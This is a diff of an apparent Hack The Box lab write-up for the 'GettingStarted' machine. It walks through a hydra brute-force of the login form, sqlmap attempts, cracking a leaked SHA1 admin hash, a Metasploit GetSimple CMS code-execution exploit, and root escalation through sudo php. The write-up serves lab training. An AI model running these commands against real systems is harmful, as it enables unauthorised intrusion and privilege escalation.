@@ -44,15 +44,14 @@ Let's build the command. First let's get rockyou.
 The request for login has the format:
 `http://gettingstarted.htb/admin/index.php?userid=username&pwd=password&submitted=Login`
 Let's try
-hydra -L ~/gs/user-dict.txt -P ~/rockyou/rockyou.txt gettingstarted.htb http-form-post '/admin/index.php:userid=^USER^&pwd=^PASS^&submitted=Login:F=Login failed. Please double check'
+`hydra -L ~/gs/user-dict.txt -P ~/rockyou/rockyou.txt gettingstarted.htb http-form-post '/admin/index.php:userid=^USER^&pwd=^PASS^&submitted=Login:F=Login failed. Please double check'`
 A lof of false positives, not sure why. Probably overloaded the server, needed to restart the machine. The found passwords don't seem to work.
 
 Trying SQLMAP with a request copied from burp.
 `sqlmap -r gs/login_r.txt -p pwd --risk 3 --level 5 --batch`
 SQMap scan complete, doesn't seem to be injectable. Gonna retry with the user param.
 `sqlmap -r gs/login_r.txt -p userid --risk 3 --level 5 --batch`
-SQLMAP in progress #tochange
-
+SQLMAP failed here, so need to search for different options for entry.
 Found admin credentials while going trough the /data subfolder in:
 `http://gettingstarted.htb/data/users/admin.xml`
 No idea why I didn't try this sooner. It's always the easy answer, isn't it?
@@ -67,8 +66,8 @@ No idea why I didn't try this sooner. It's always the easy answer, isn't it?
 	<LANG>en_US</LANG>
 </item>
 ```
-So we got the credential pair of
-admin:d033e22ae348aeb5660fc2140aec35850c4da997
+So we got the credential pair of:
+`admin:d033e22ae348aeb5660fc2140aec35850c4da997`
 The password in this format doesn't work. It's probably hashed, or encoded. Let's try decoding it first with cyberchef, and if that doesn't work, we try hashcat.
 Decoding in cyberchef doesn't seem to work. Let's try to identify the type of hash then. 
 `hashidentifier d033e22ae348aeb5660fc2140aec35850c4da997`
@@ -82,8 +81,8 @@ Ok. I would guess it's SHA1 or MySQL5 SHA-1. Let's try to crack both in rockyou 
 `hashcat -m 100 -a 3 -o outhash.txt d033e22ae348aeb5660fc2140aec35850c4da997`
 It was indeed SHA1. The cracked hash is `admin`. Admin. Really? I could've checked that. xD
 Let's use the exploit we found earlier to gain a shell.
-Seems like the button is broken, due to Flash Player getting discontinued. Let's try to find vulns in metasploit. Found `exploit/multi/http/getsimplecms_unauth_code_exec`
-Let's try that
+Seems like the button is broken, due to Flash Player getting discontinued. Let's try to find vulns in metasploit. Found `exploit/multi/http/getsimplecms_unauth_code_exec`.
+Let's try that.
 Okay, the exploit worked, I got a shell. Upgraded it with
 `python3 -c 'import pty; pty.spawn("/bin/bash")'`
 We are logged in as the `www-data` user. We have enough privelage, to get the user flag from `/home/mrb3n/user.txt`, so we cat it out. Nice.
@@ -91,10 +90,10 @@ We are logged in as the `www-data` user. We have enough privelage, to get the us
 # Privelage Escalation
 Let's try `LinEnum.sh` first, since this is what HTB reccomended.
 But before that, it would be nice to check if we can get an SSH session going.
-We cannot. Before even uploading the script, I checked for what we can do as root without a password, with `sudo -l`
+We cannot. Before even uploading the script, I checked for what we can do as root without a password, with `sudo -l`.
 Bingo! We can run `/usr/bin/php` from the current user. Let's try to leverage that.
 GTFOBins shows us that we can use `sudo php -r "system('/bin/bash');"` to get sudo access. Let's try that.
-And it worked! We cat the flag
+And it worked! We cat the flag:
 `cat /root/root.txt`
 
 # Summary
